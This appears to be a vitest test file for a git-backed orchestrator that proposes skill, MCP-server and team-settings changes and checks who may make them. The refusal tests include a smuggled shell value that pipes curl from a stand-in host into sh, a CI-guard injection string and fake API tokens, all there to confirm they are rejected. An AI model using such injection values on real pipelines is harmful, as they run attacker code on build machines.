import { execFileSync } from "node:child_process";
import { existsSync, mkdirSync, mkdtempSync, readFileSync, rmSync, symlinkSync, writeFileSync } from "node:fs";
import { tmpdir } from "node:os";
import { dirname, join } from "node:path";
import type { MiddlewareHandler } from "hono";
import { afterEach, describe, expect, it } from "vitest";
import { seed } from "../demo/seed.js";
import { createApp, MIRROR_GONE, mirrorDir, syncRepo } from "./app.js";
import type { OrchestratorContext } from "./app.js";
import type { OrchestratorEnv, Principal } from "./auth.js";
import { ChangeRefused, prepareChange } from "./changes.js";
import { markOurs } from "./editing.js";
import { createLocalForge, localDescriptionRef, localRepoPath, mergeLocalRequest } from "./forge/local.js";
import { git, gitMaybe } from "./git.js";
import { closeRequest, mergeRequest, propose, reconcileLocalRequests, teamAssignment } from "./propose.js";
import { openSqliteStore } from "./store.js";

const dirs: string[] = [];
afterEach(() => {
  for (const dir of dirs.splice(0)) rmSync(dir, { recursive: true, force: true });
});

const ADMIN: Principal = { id: "a", name: "Ada Example", email: "ada@example.invalid", role: "admin", ownedTeams: [] };
const PAYMENTS_OWNER: Principal = { id: "p", name: "Pat Example", email: "pat@example.invalid", role: "member", ownedTeams: ["Payments"], forgeLogin: "pat" };
const PLATFORM_OWNER: Principal = { id: "l", name: "Lin Example", email: "lin@example.invalid", role: "member", ownedTeams: ["Platform"] };
const MEMBER: Principal = { id: "m", name: "Max Example", email: "max@example.invalid", role: "member", ownedTeams: [] };
const LITERAL_TOKEN = "sk-live-0123456789abcdefABCDEF";

function as(user: Principal): MiddlewareHandler<OrchestratorEnv> {
  return async (c, next) => {
    c.set("user", user);
    c.set("csrf", "t");
    await next();
  };
}

async function seeded(defaultBranch = "main"): Promise<{ ctx: OrchestratorContext; root: string }> {
  const root = mkdtempSync(join(tmpdir(), "orchestrator-changes-"));
  dirs.push(root);
  const { configFile } = seed(join(root, "demo"), defaultBranch);
  const config = JSON.parse(readFileSync(configFile, "utf8"));
  const ctx: OrchestratorContext = { store: openSqliteStore(":memory:"), dataDir: join(root, "data"), tenant: config.tenant };
  for (const repo of config.repos) {
    await ctx.store.upsertRepo({ ...repo, tenant: config.tenant });
    await syncRepo(ctx, repo.id);
  }
  return { ctx, root };
}

async function repoOf(ctx: OrchestratorContext, id = "payments-skills") {
  const repo = (await ctx.store.getRepo(ctx.tenant, id))!;
  return { repo, mirror: mirrorDir(ctx, id), bare: localRepoPath(repo.url)!, head: repo.head! };
}

/** Counts the git processes the orchestrator starts from now on, through a stand-in first on PATH that runs the real one. */
function gitCounter(root: string): { calls: () => number; stop: () => void } {
  const bin = mkdtempSync(join(root, "bin-"));
  const log = join(bin, "calls");
  writeFileSync(log, "");
  const real = execFileSync("sh", ["-c", "command -v git"], { encoding: "utf8" }).trim();
  writeFileSync(join(bin, "git"), `#!/bin/sh\necho call >> '${log}'\nexec '${real}' "$@"\n`, { mode: 0o755 });
  const path = process.env.PATH;
  process.env.PATH = `${bin}:${path}`;
  return {
    calls: () => readFileSync(log, "utf8").split("\n").filter(Boolean).length,
    stop: () => {
      process.env.PATH = path;
    },
  };
}

/**
 * How many repositories the orchestrator works on at once from now on: a stand-in first on PATH
 * holds each `symbolic-ref` (the first git call a repository's check makes) for a moment and
 * notes how many were held together.
 */
function gitOverlap(root: string): { most: () => number; stop: () => void } {
  const bin = mkdtempSync(join(root, "bin-"));
  const held = join(bin, "held");
  const seen = join(bin, "seen");
  mkdirSync(held);
  writeFileSync(seen, "");
  const real = execFileSync("sh", ["-c", "command -v git"], { encoding: "utf8" }).trim();
  writeFileSync(
    join(bin, "git"),
    `#!/bin/sh\nif [ "$1" = symbolic-ref ]; then\n  touch '${held}'/$$\n  sleep 0.3\n  ls '${held}' | wc -l >> '${seen}'\n  rm -f '${held}'/$$\nfi\nexec '${real}' "$@"\n`,
    { mode: 0o755 },
  );
  const path = process.env.PATH;
  process.env.PATH = `${bin}:${path}`;
  return {
    most: () => Math.max(0, ...readFileSync(seen, "utf8").split("\n").filter(Boolean).map(Number)),
    stop: () => {
      process.env.PATH = path;
    },
  };
}

const SKILL = (name: string, extra = "") => `---\nname: ${name}\ndescription: Use at shift change to hand over the pager.\n---\n\n1. Write the handover.\n${extra}`;

function post(app: ReturnType<typeof createApp>, path: string, body: unknown) {
  return app.request(path, { method: "POST", body: JSON.stringify(body), headers: { "content-type": "application/json", "x-csrf-token": "t" } });
}

/** Commits files straight onto a seeded repository's default branch, the way a teammate's merge would. */
function commitToMain(bare: string, root: string, files: Record<string, string>): void {
  const work = mkdtempSync(join(root, "teammate-"));
  git(["clone", "--quiet", bare, work], work);
  for (const [path, content] of Object.entries(files)) {
    mkdirSync(dirname(join(work, path)), { recursive: true });
    writeFileSync(join(work, path), content);
  }
  git(["add", "-A"], work);
  git(["commit", "--quiet", "-m", "chore: teammate change"], work);
  git(["fetch", "--quiet", work, "main:main"], bare);
}

describe("building a change from the orchestrator", () => {
  it("given a new skill, when it is proposed, then a branch carries only its SKILL.md with the team prefix on the title, and the default branch does not move", async () => {
    // given
    const { ctx } = await seeded();
    const { repo, mirror, bare, head } = await repoOf(ctx);

    // when
    const prepared = await prepareChange(mirror, head, { kind: "skill.add", slug: "on-call-handover", content: SKILL("on-call-handover") }, "feat(skill): add on-call-handover", "Pat Example", { commitPrefix: "PAY" });
    const request = await propose(ctx, repo, PAYMENTS_OWNER, prepared);

    // then
    expect(prepared.title).toBe("PAY feat(skill): add on-call-handover");
    expect(prepared.files.map((f) => f.path)).toEqual(["skills/on-call-handover/SKILL.md"]);
    expect(git(["rev-parse", "main"], bare).trim()).toBe(head);
    expect(git(["show", `${request.branch}:skills/on-call-handover/SKILL.md`], bare)).toContain("name: on-call-handover");
    expect(git(["log", "-1", "--format=%s|%an", request.branch], bare).trim()).toBe("PAY feat(skill): add on-call-handover|Pat Example");
    expect(await ctx.store.listRequests(ctx.tenant, repo.id)).toMatchObject([{ number: 1, status: "open", provider: "local", createdBy: "pat@example.invalid" }]);
  });

  it("given a message that already carries the prefix, when it is prepared, then the prefix appears once", async () => {
    const { ctx } = await seeded();
    const { mirror, head } = await repoOf(ctx);
    const prepared = await prepareChange(mirror, head, { kind: "skill.delete", slug: "release-checklist" }, "PAY chore(skill): remove release-checklist", "Pat", { commitPrefix: "PAY" });
    expect(prepared.title).toBe("PAY chore(skill): remove release-checklist");
  });

  it("given a skill that ships two files, when it is removed, then both files are deleted in the request", async () => {
    // given
    const { ctx } = await seeded();
    const { repo, mirror, bare, head } = await repoOf(ctx);

    // when
    const request = await propose(ctx, repo, ADMIN, await prepareChange(mirror, head, { kind: "skill.delete", slug: "add-ledger-migration" }, "chore(skill): remove add-ledger-migration", "Ada"));

    // then
    expect(gitMaybe(["ls-tree", "-r", "--name-only", request.branch, "--", "skills/add-ledger-migration"], bare)?.trim()).toBe("");
    expect(git(["ls-tree", "-r", "--name-only", "main", "--", "skills/add-ledger-migration"], bare).trim().split("\n")).toHaveLength(2);
  });

  it.each([
    ["a token pasted into the skill", { kind: "skill.edit", slug: "release-checklist", content: SKILL("release-checklist", `export API_KEY=${LITERAL_TOKEN}\n`) }, /looks like a/],
    ["a frontmatter name that is not the folder", { kind: "skill.add", slug: "on-call", content: SKILL("something-else") }, /has to match/],
    ["no frontmatter", { kind: "skill.add", slug: "on-call", content: "just text\n" }, /frontmatter/],
    ["a skill that already exists", { kind: "skill.add", slug: "release-checklist", content: SKILL("release-checklist") }, /already exists/],
    ["a path in the skill name", { kind: "skill.add", slug: "../.mcp", content: SKILL("x") }, /lower-case/],
    ["an unchanged skill", { kind: "skill.edit", slug: "release-checklist", content: "" }, /empty/],
  ])("given %s, when it is prepared, then it is refused", async (_label, change, message) => {
    // given
    const { ctx } = await seeded();
    const { mirror, head } = await repoOf(ctx);

    // when
    const attempt = () => prepareChange(mirror, head, change, "a message", "Ada");

    // then
    await expect(attempt()).rejects.toThrow(ChangeRefused);
    await expect(attempt()).rejects.toThrow(message);
  });

  it("given a frontmatter that names the skill twice, when it is prepared, then it is refused", async () => {
    const { ctx } = await seeded();
    const { mirror, head } = await repoOf(ctx);
    const content = "---\nname: deploy\ndescription: Use when deploying.\nname: barx\n---\n\nBody.\n";
    await expect(prepareChange(mirror, head, { kind: "skill.add", slug: "barx", content }, "m", "Ada")).rejects.toThrow(/more than once/);
  });

  it("given a server whose args is a single string, when it is proposed, then it is refused so the request shows the command teammates run", async () => {
    const { ctx } = await seeded();
    const { mirror, head } = await repoOf(ctx);
    await expect(prepareChange(mirror, head, { kind: "mcp.add", name: "x", config: { command: "x-mcp", args: "--flag" } }, "m", "Ada")).rejects.toThrow(/args has to be a list/);
  });

  it("given no commit message, when a change is prepared, then it is refused with the orchestrator's proposal named", async () => {
    const { ctx } = await seeded();
    const { mirror, head } = await repoOf(ctx);
    await expect(prepareChange(mirror, head, { kind: "skill.delete", slug: "release-checklist" }, "  ", "Ada")).rejects.toThrow(/proposes "chore\(skill\): remove release-checklist"/);
  });

  it("given a repository whose plugin carries a version, when a change is prepared, then the same request raises the patch version", async () => {
    // given
    const { ctx, root } = await seeded();
    const { bare } = await repoOf(ctx);
    commitToMain(bare, root, { ".claude-plugin/plugin.json": JSON.stringify({ name: "payments-skills", version: "1.4.9" }) });
    await syncRepo(ctx, "payments-skills");
    const { mirror, head } = await repoOf(ctx);

    // when
    const prepared = await prepareChange(mirror, head, { kind: "skill.delete", slug: "release-checklist" }, "chore(skill): remove release-checklist", "Ada");

    // then
    const manifest = prepared.files.find((f) => f.path === ".claude-plugin/plugin.json")!;
    expect(JSON.parse(manifest.content!)).toEqual({ name: "payments-skills", version: "1.4.10" });
    expect(prepared.body).toContain("version 1.4.10");
  });

  it("given a versioned repository, when two changes are opened at the same moment, then each raises the version to a number of its own", async () => {
    // given
    const { ctx, root } = await seeded();
    const { bare } = await repoOf(ctx);
    commitToMain(bare, root, { ".claude-plugin/plugin.json": JSON.stringify({ name: "payments-skills", version: "0.1.19" }) });
    await syncRepo(ctx, "payments-skills");
    const { head } = await repoOf(ctx);
    const app = createApp(ctx, as(ADMIN));
    const remove = (slug: string) => ({ baseSha: head, message: `chore(skill): remove ${slug}`, change: { kind: "skill.delete", slug } });

    // when
    const opened = await Promise.all(["release-checklist", "add-ledger-migration"].map(async (slug) => (await (await post(app, "/api/repos/payments-skills/changes", remove(slug))).json()).request));

    // then
    const versions = opened.map((r: { branch: string }) => JSON.parse(git(["show", `${r.branch}:.claude-plugin/plugin.json`], bare)).version).sort();
    expect(versions).toEqual(["0.1.20", "0.1.21"]);
  });

  it("given a teammate's share pushed after the orchestrator last read the repository, when a change is opened, then its raise goes past the number that share claims", async () => {
    // given
    const { ctx, root } = await seeded();
    const { bare } = await repoOf(ctx);
    commitToMain(bare, root, { ".claude-plugin/plugin.json": JSON.stringify({ name: "payments-skills", version: "0.1.19" }) });
    await syncRepo(ctx, "payments-skills");
    const { head } = await repoOf(ctx);
    const work = mkdtempSync(join(root, "teammate-share-"));
    git(["clone", "--quiet", bare, work], work);
    git(["checkout", "--quiet", "-b", "handbook/share-on-call"], work);
    writeFileSync(join(work, ".claude-plugin", "plugin.json"), JSON.stringify({ name: "payments-skills", version: "0.1.25" }));
    git(["commit", "--quiet", "-am", "feat(skill): share on-call"], work);
    git(["fetch", "--quiet", work, "handbook/share-on-call:handbook/share-on-call"], bare);

    // when
    const res = await post(createApp(ctx, as(ADMIN)), "/api/repos/payments-skills/changes", { baseSha: head, message: "chore(skill): remove release-checklist", change: { kind: "skill.delete", slug: "release-checklist" } });
    const { request } = await res.json();

    // then
    expect(JSON.parse(git(["show", `${request.branch}:.claude-plugin/plugin.json`], bare)).version).toBe("0.1.26");
    expect(git(["notes", "--ref", `refs/notes/orchestrator/${request.branch}`, "show", request.branch], bare)).toContain("past 0.1.25 on handbook/share-on-call");
  });
});

describe("adding an MCP server from the orchestrator", () => {
  it("given a server whose env holds a literal, when it is proposed, then the plugin's refusal names the key, the value appears in no message, and no branch is made", async () => {
    // given
    const { ctx } = await seeded();
    const { mirror, bare, head } = await repoOf(ctx);
    const before = git(["for-each-ref", "--format=%(refname)", "refs/heads"], bare);

    // when
    let message = "";
    try {
      await prepareChange(mirror, head, { kind: "mcp.add", name: "billing", config: { command: "billing-mcp", env: { BILLING_TOKEN: LITERAL_TOKEN } } }, "feat(mcp): add billing", "Ada");
    } catch (err) {
      message = (err as Error).message;
    }

    // then
    expect(message).toBe(
      "billing is not shareable as written: env.BILLING_TOKEN holds a literal value; move the value into an environment variable referenced as ${VAR} and review again",
    );
    expect(message).not.toContain(LITERAL_TOKEN);
    expect(git(["for-each-ref", "--format=%(refname)", "refs/heads"], bare)).toBe(before);
  });

  it.each([
    ["a token in its arguments", { command: "github-mcp", args: ["--token", "ghp_AbCdEfGhIjKlMnOpQrStUvWxYz0123456789"] }, "its args[1] looks like it contains a secret", "ghp_AbCdEfGhIjKlMnOpQrStUvWxYz0123456789"],
    ["a token in its URL", { type: "http", url: "https://mcp.example.com/s/0123456789abcdef0123456789abcdef/sse" }, "its URL carries what looks like a credential (path segment 2)", "0123456789abcdef0123456789abcdef"],
    ["a literal header", { type: "http", url: "https://mcp.example.com/mcp", headers: { Authorization: "Bearer abc" } }, "headers.Authorization holds a literal value", "Bearer abc"],
  ])("given a server with %s, when it is refused, then the reason names where, says to review again here, and carries neither the value nor the plugin's command advice", async (_label, config, reason, value) => {
    // given
    const { ctx } = await seeded();
    const { mirror, head } = await repoOf(ctx);

    // when
    let message = "";
    try {
      await prepareChange(mirror, head, { kind: "mcp.add", name: "remote", config }, "feat(mcp): add remote", "Ada");
    } catch (err) {
      message = (err as Error).message;
    }

    // then
    expect(message).toContain(`remote is not shareable as written: ${reason}`);
    expect(message).toMatch(/move the value into an environment variable referenced as \$\{VAR\} and review again$/);
    expect(message).not.toMatch(/share again|run share/);
    expect(message).not.toContain(value);
  });

  it("given a token in a URL path, when it is proposed, then it is refused without the URL", async () => {
    const { ctx } = await seeded();
    const { mirror, head } = await repoOf(ctx);
    const url = "https://mcp.example.com/s/0123456789abcdef0123456789abcdef/sse";
    const attempt = () => prepareChange(mirror, head, { kind: "mcp.add", name: "remote", config: { type: "http", url } }, "feat(mcp): add remote", "Ada");
    await expect(attempt()).rejects.toThrow(/URL carries what looks like a credential/);
    await expect(attempt()).rejects.not.toThrow(url);
  });

  it("given a server that references its secret by name, when it is proposed, then .mcp.json gains it and keeps the servers already there", async () => {
    // given
    const { ctx } = await seeded();
    const { repo, mirror, bare, head } = await repoOf(ctx);

    // when
    const prepared = await prepareChange(
      mirror,
      head,
      { kind: "mcp.add", name: "billing", config: { command: "billing-mcp", args: ["--read-only"], env: { BILLING_TOKEN: "${BILLING_TOKEN}" } } },
      "feat(mcp): add billing",
      "Ada",
    );
    const request = await propose(ctx, repo, ADMIN, prepared);

    // then
    const servers = JSON.parse(git(["show", `${request.branch}:.mcp.json`], bare)).mcpServers;
    expect(Object.keys(servers).sort()).toEqual(["billing", "docs", "postgres"]);
    expect(servers.billing.env).toEqual({ BILLING_TOKEN: "${BILLING_TOKEN}" });
    expect(prepared.body).toContain("`BILLING_TOKEN`");
    expect(prepared.body).toContain("runs that command on every teammate's machine");
  });

  it("given a name the repository already declares, when it is proposed, then it is refused", async () => {
    const { ctx } = await seeded();
    const { mirror, head } = await repoOf(ctx);
    await expect(prepareChange(mirror, head, { kind: "mcp.add", name: "docs", config: { type: "http", url: "https://docs.example.com/v2" } }, "m", "Ada")).rejects.toThrow(/already declares docs/);
  });
});

describe("editing and removing an MCP server from the orchestrator", () => {
  const written = {
    $schema: "https://example.com/mcp.schema.json",
    mcpServers: {
      postgres: { command: "npx", args: ["-y", "@modelcontextprotocol/server-postgres", "${PAYMENTS_DB_URL}"] },
      docs: { type: "http", url: "https://docs.example.com/mcp" },
      billing: { command: "billing-mcp", env: { BILLING_TOKEN: "hand-written-literal-value" } },
    },
  };

  async function withMcpFile(text = JSON.stringify(written, null, 2) + "\n") {
    const { ctx, root } = await seeded();
    const { bare } = await repoOf(ctx);
    commitToMain(bare, root, { ".mcp.json": text });
    await syncRepo(ctx, "payments-skills");
    return { ctx, ...(await repoOf(ctx)) };
  }

  const mcpOf = (prepared: { files: { path: string; content: string | null }[] }) => JSON.parse(prepared.files.find((f) => f.path === ".mcp.json")!.content!);

  it("given a declared server, when its definition is edited, then only that entry changes, in its place, and every other key of the file is kept", async () => {
    // given
    const { mirror, head } = await withMcpFile();

    // when
    const prepared = await prepareChange(mirror, head, { kind: "mcp.edit", name: "docs", config: { type: "http", url: "https://docs.example.com/v2/mcp", headers: { Authorization: "${DOCS_TOKEN}" } } }, "feat(mcp): update docs", "Ada");

    // then
    const mcp = mcpOf(prepared);
    expect(Object.keys(mcp)).toEqual(["$schema", "mcpServers"]);
    expect(Object.keys(mcp.mcpServers)).toEqual(["postgres", "docs", "billing"]);
    expect(mcp.mcpServers.docs).toEqual({ type: "http", url: "https://docs.example.com/v2/mcp", headers: { Authorization: "${DOCS_TOKEN}" } });
    expect(mcp.mcpServers.postgres).toEqual(written.mcpServers.postgres);
    expect(prepared.body).toContain("Changes the MCP server `docs` (http) for everyone who installs this plugin.");
  });

  it("given an edit that writes a literal header, when it is prepared, then the share rule refuses it as it refuses an addition, without the value", async () => {
    const { mirror, head } = await withMcpFile();
    const attempt = () => prepareChange(mirror, head, { kind: "mcp.edit", name: "docs", config: { type: "http", url: "https://docs.example.com/mcp", headers: { Authorization: "Bearer abc" } } }, "m", "Ada");
    await expect(attempt()).rejects.toThrow("docs is not shareable as written: headers.Authorization holds a literal value");
    await expect(attempt()).rejects.not.toThrow("Bearer abc");
  });

  it.each([
    ["a server the file does not declare", { kind: "mcp.edit", name: "search", config: { type: "http", url: "https://search.example.com/mcp" } }, ".mcp.json declares no server search to edit"],
    ["the definition already there", { kind: "mcp.edit", name: "docs", config: { type: "http", url: "https://docs.example.com/mcp" } }, "docs is unchanged"],
    ["an addition under a declared name", { kind: "mcp.add", name: "docs", config: { type: "http", url: "https://docs.example.com/v2" } }, ".mcp.json already declares docs; edit it instead"],
    ["a removal of a server the file does not declare", { kind: "mcp.remove", name: "search" }, ".mcp.json declares no server search to remove"],
    ["a removal under a name no server has", { kind: "mcp.remove", name: "../x" }, "a server name is letters, digits, dot, dash or underscore"],
  ])("given %s, when it is prepared, then it is refused", async (_label, change, message) => {
    const { mirror, head } = await withMcpFile();
    await expect(prepareChange(mirror, head, change, "m", "Ada")).rejects.toThrow(message);
  });

  it("given a declared server, when it is removed, then only its entry goes and the rest of the file, the server the share rule refuses included, is kept as written", async () => {
    // given
    const { mirror, head } = await withMcpFile();

    // when
    const prepared = await prepareChange(mirror, head, { kind: "mcp.remove", name: "postgres" }, "chore(mcp): remove postgres", "Ada");

    // then
    expect(mcpOf(prepared)).toEqual({ $schema: written.$schema, mcpServers: { docs: written.mcpServers.docs, billing: written.mcpServers.billing } });
    expect(prepared.body).toContain("Removes the MCP server `postgres`");
  });

  it("given a file that is a bare map of servers, when one is removed, then the others stay in the same shape", async () => {
    const { mirror, head } = await withMcpFile(JSON.stringify(written.mcpServers, null, 2) + "\n");
    const prepared = await prepareChange(mirror, head, { kind: "mcp.remove", name: "docs" }, "m", "Ada");
    expect(mcpOf(prepared)).toEqual({ postgres: written.mcpServers.postgres, billing: written.mcpServers.billing });
  });

  it("given a file that is not JSON, when a server is removed, then it is refused rather than overwritten", async () => {
    const { mirror, head } = await withMcpFile("{ not json");
    await expect(prepareChange(mirror, head, { kind: "mcp.remove", name: "docs" }, "m", "Ada")).rejects.toThrow(/will not overwrite a file it cannot read/);
  });

  it("given a server that passes the share rule and one that does not, when each is read for editing, then the first comes back whole and the second is withheld without its value", async () => {
    // given
    const { ctx } = await withMcpFile();
    const app = createApp(ctx, as(ADMIN));

    // when
    const docs = await app.request("/api/repos/payments-skills/mcp-servers/docs");
    const billing = await app.request("/api/repos/payments-skills/mcp-servers/billing");
    const unknown = await app.request("/api/repos/payments-skills/mcp-servers/search");

    // then
    expect(await docs.json()).toMatchObject({ config: written.mcpServers.docs });
    expect(billing.status).toBe(409);
    const withheld = await billing.text();
    expect(withheld).toContain("env.BILLING_TOKEN holds a literal value");
    expect(withheld).not.toContain("hand-written-literal-value");
    expect(unknown.status).toBe(404);
  });
});

describe("changing how commits and branches are named", () => {
  const original = { commitPrefix: "PAY", branchExample: "PAY-1-fix-login", reviewers: ["ada"], labels: ["skills"], scaffoldVersion: "0.32.0" };

  async function withTeamFile(files: Record<string, string> = {}) {
    const { ctx, root } = await seeded();
    const { bare } = await repoOf(ctx);
    commitToMain(bare, root, { ".teamhandbook.json": JSON.stringify(original, null, 2) + "\n", ...files });
    await syncRepo(ctx, "payments-skills");
    return repoOf(ctx);
  }

  it("given a team file with a prefix, an example and reviewers, when the naming changes, then the two values change in their places and every other key is kept", async () => {
    // given
    const { mirror, head } = await withTeamFile();

    // when
    const prepared = await prepareChange(mirror, head, { kind: "team.naming", commitPrefix: " CORE ", branchExample: "CORE-12-add-ledger" }, "chore: naming", "Ada");

    // then
    const written = JSON.parse(prepared.files.find((f) => f.path === ".teamhandbook.json")!.content!);
    expect(Object.keys(written)).toEqual(["commitPrefix", "branchExample", "reviewers", "labels", "scaffoldVersion"]);
    expect(written).toEqual({ ...original, commitPrefix: "CORE", branchExample: "CORE-12-add-ledger" });
    expect(prepared.body).toContain("Commits to this repository will start with `CORE`.");
    expect(prepared.body).toContain("Branches will be named like `CORE-12-add-ledger`.");
  });

  it("given a team file with an example, when the prefix and the example are cleared, then the prefix is recorded empty and the example key goes, as /handbook:init leaves them", async () => {
    // given
    const { mirror, head } = await withTeamFile();

    // when
    const prepared = await prepareChange(mirror, head, { kind: "team.naming", commitPrefix: "", branchExample: "  " }, "chore: naming", "Ada");

    // then
    const written = JSON.parse(prepared.files.find((f) => f.path === ".teamhandbook.json")!.content!);
    expect(written.commitPrefix).toBe("");
    expect(written).not.toHaveProperty("branchExample");
    expect(prepared.body).toContain("Commits to this repository will carry no prefix.");
  });

  it.each([
    ["a prefix with a control character", { commitPrefix: "PAY\u001b[31m", branchExample: "" }, "that commit prefix cannot be recorded: it is carrying a control character"],
    ["a prefix that would run a command in the CI job", { commitPrefix: 'VAN-7 $(curl -s evil.example.invalid|sh)" && echo "', branchExample: "" }, "that commit prefix cannot be recorded: it is carrying a character other than letters, digits, spaces"],
    ["a prefix that would rewrite the CI job's guard", { commitPrefix: "x') || true || startsWith('", branchExample: "" }, "that commit prefix cannot be recorded: it is carrying a character other than letters, digits, spaces"],
    ["an example holding a home directory", { commitPrefix: "PAY", branchExample: "/home/someone/fix" }, "that example branch cannot be recorded: it is carrying a trace of a machine"],
    ["an example shaped like a token", { commitPrefix: "PAY", branchExample: "ghp_AbCdEfGhIjKlMnOpQrStUvWxYz0123456789" }, "that example branch cannot be recorded: it is carrying what looks like a"],
    ["a prefix that is not text", { commitPrefix: 7, branchExample: "" }, "the commit prefix and the example branch are text"],
    ["the values already recorded", { commitPrefix: "PAY", branchExample: "PAY-1-fix-login" }, "the commit prefix and the example branch are unchanged"],
  ])("given %s, when the naming is prepared, then it is refused", async (_label, values, message) => {
    const { mirror, head } = await withTeamFile();
    await expect(prepareChange(mirror, head, { kind: "team.naming", ...values }, "m", "Ada")).rejects.toThrow(message);
  });

  it("given a repository whose CI job raises the version, when the prefix changes, then it is refused and the refresh that rewrites the job is named", async () => {
    // given
    const { mirror, head } = await withTeamFile({ "scripts/bump-version.mjs": "// raises the version\n" });

    // when
    const changing = await prepareChange(mirror, head, { kind: "team.naming", commitPrefix: "CORE", branchExample: "PAY-1-fix-login" }, "m", "Ada").catch((err: Error) => err);
    const clearing = await prepareChange(mirror, head, { kind: "team.naming", commitPrefix: "", branchExample: "PAY-1-fix-login" }, "m", "Ada").catch((err: Error) => err);

    // then
    expect((changing as Error).message).toContain(`changes together with that job: run /handbook:init --upgrade --commit-prefix "CORE" from a teammate's machine, which writes the team file and the job in one request`);
    expect((clearing as Error).message).toContain(`set commitPrefix to "" in .teamhandbook.json, then run /handbook:init --upgrade`);
  });

  it("given a repository whose CI job raises the version, when only the example changes, then it is prepared, since the job's commits do not carry it", async () => {
    // given
    const { mirror, head } = await withTeamFile({ "scripts/bump-version.mjs": "// raises the version\n" });

    // when
    const prepared = await prepareChange(mirror, head, { kind: "team.naming", commitPrefix: "PAY", branchExample: "PAY-2-new-shape" }, "m", "Ada");

    // then
    expect(JSON.parse(prepared.files.find((f) => f.path === ".teamhandbook.json")!.content!).branchExample).toBe("PAY-2-new-shape");
  });
});

describe("changing who reviews requests", () => {
  it("given a team file with a commit prefix and a usage endpoint, when reviewers and labels change, then every other key is kept in its place", async () => {
    // given
    const { ctx, root } = await seeded();
    const { bare } = await repoOf(ctx);
    const original = { commitPrefix: "PAY", reviewers: ["ada"], labels: ["skills"], scaffoldVersion: "0.32.0", usage: { endpoint: "https://orchestrator.example.com/ingest/usage/x/payments-skills" } };
    commitToMain(bare, root, { ".teamhandbook.json": JSON.stringify(original, null, 2) + "\n" });
    await syncRepo(ctx, "payments-skills");
    const { mirror, head } = await repoOf(ctx);

    // when
    const prepared = await prepareChange(mirror, head, { kind: "team.settings", reviewers: ["grace", " linus ", "grace"], labels: ["skills", "needs review"] }, "chore: reviewers", "Ada");

    // then
    const written = JSON.parse(prepared.files[0]!.content!);
    expect(Object.keys(written)).toEqual(["commitPrefix", "reviewers", "labels", "scaffoldVersion", "usage"]);
    expect(written).toEqual({ ...original, reviewers: ["grace", "linus"], labels: ["skills", "needs review"] });
  });

  it("given a team file that is not JSON, when reviewers change, then it is refused rather than overwritten", async () => {
    const { ctx, root } = await seeded();
    const { bare } = await repoOf(ctx);
    commitToMain(bare, root, { ".teamhandbook.json": "{ not json" });
    await syncRepo(ctx, "payments-skills");
    const { mirror, head } = await repoOf(ctx);
    await expect(prepareChange(mirror, head, { kind: "team.settings", reviewers: ["grace"], labels: [] }, "m", "Ada")).rejects.toThrow(/will not overwrite/);
  });

  it.each([
    ["a reviewer that is not a username", { reviewers: ["two words"], labels: [] }, "reviewers entry 1 cannot be recorded: not a username"],
    ["a label with a comma", { reviewers: [], labels: ["skills", "a,b"] }, "labels entry 2 cannot be recorded: not a label name"],
    ["a label shaped like a token", { reviewers: [], labels: ["ghp_AbCdEfGhIjKlMnOpQrStUvWxYz0123456789"] }, "labels entry 1 cannot be recorded: carrying what looks like a"],
    ["a label holding a home directory", { reviewers: [], labels: ["/home/someone/notes"] }, "labels entry 1 cannot be recorded: carrying a trace of a machine"],
    ["twenty-one reviewers", { reviewers: Array.from({ length: 21 }, (_, i) => `r${i}`), labels: [] }, "21 reviewers cannot be recorded: more than 20"],
  ])("given %s, when reviewers and labels are prepared, then the plugin's own rule refuses it", async (_label, lists, message) => {
    const { ctx } = await seeded();
    const { mirror, head } = await repoOf(ctx);
    await expect(prepareChange(mirror, head, { kind: "team.settings", ...lists }, "m", "Ada")).rejects.toThrow(message);
  });

  it("given a reviewer written with an @, when it is prepared, then it is recorded as typed, the way the plugin records it", async () => {
    const { ctx } = await seeded();
    const { mirror, head } = await repoOf(ctx);
    const prepared = await prepareChange(mirror, head, { kind: "team.settings", reviewers: ["@grace"], labels: ["type::bug"] }, "m", "Ada");
    expect(JSON.parse(prepared.files[0]!.content!)).toMatchObject({ reviewers: ["@grace"], labels: ["type::bug"] });
  });

  it("given a team file someone wrote by hand with entries the plugin would drop, when a request is opened, then only the usable ones reach the forge", async () => {
    // given
    const { ctx, root } = await seeded();
    const { bare } = await repoOf(ctx);
    commitToMain(bare, root, {
      ".teamhandbook.json": JSON.stringify({ reviewers: ["@ada", "x/../../y", "ghp_AbCdEfGhIjKlMnOpQrStUvWxYz0123456789"], labels: ["a,b", "skills"] }),
    });
    await syncRepo(ctx, "payments-skills");
    const { repo } = await repoOf(ctx);

    // when
    const assignment = await teamAssignment(ctx, repo, ADMIN);

    // then
    expect(assignment).toEqual({ reviewers: ["ada"], labels: ["skills"] });
  });

  it("given a hand-written list longer than the plugin allows, when a request is opened, then none of it is used", async () => {
    const { ctx, root } = await seeded();
    const { bare } = await repoOf(ctx);
    commitToMain(bare, root, { ".teamhandbook.json": JSON.stringify({ reviewers: Array.from({ length: 21 }, (_, i) => `r${i}`), labels: ["skills"] }) });
    await syncRepo(ctx, "payments-skills");
    const { repo } = await repoOf(ctx);
    expect(await teamAssignment(ctx, repo, ADMIN)).toEqual({ reviewers: [], labels: ["skills"] });
  });

  it("given the team's record and an owner with a forge login, when a request is opened, then it asks the team's reviewers, carries its labels, and is assigned to that owner", async () => {
    const { ctx } = await seeded();
    const { repo } = await repoOf(ctx);
    expect(await teamAssignment(ctx, repo, PAYMENTS_OWNER)).toEqual({ reviewers: ["ada", "grace"], labels: ["skills"], assignee: "pat" });
    expect(await teamAssignment(ctx, repo, ADMIN)).toEqual({ reviewers: ["ada", "grace"], labels: ["skills"] });
  });
});

describe("who may change a team's repository", () => {
  const change = (baseSha: string) => ({ baseSha, message: "chore(skill): remove release-checklist", change: { kind: "skill.delete", slug: "release-checklist" } });

  it.each([
    ["a member", MEMBER, 403],
    ["another team's owner", PLATFORM_OWNER, 403],
    ["this team's owner", PAYMENTS_OWNER, 200],
    ["an admin", ADMIN, 200],
  ])("given %s, when they propose a change to the Payments repository, then the answer is %s", async (_label, user, status) => {
    // given
    const { ctx } = await seeded();
    const { bare, head } = await repoOf(ctx);
    const app = createApp(ctx, as(user));

    // when
    const res = await post(app, "/api/repos/payments-skills/changes", change(head));

    // then
    expect(res.status).toBe(status);
    const branches = git(["for-each-ref", "--format=%(refname:short)", "refs/heads"], bare).trim().split("\n");
    expect(branches.some((b) => b.startsWith("handbook/orchestrator-"))).toBe(status === 200);
  });

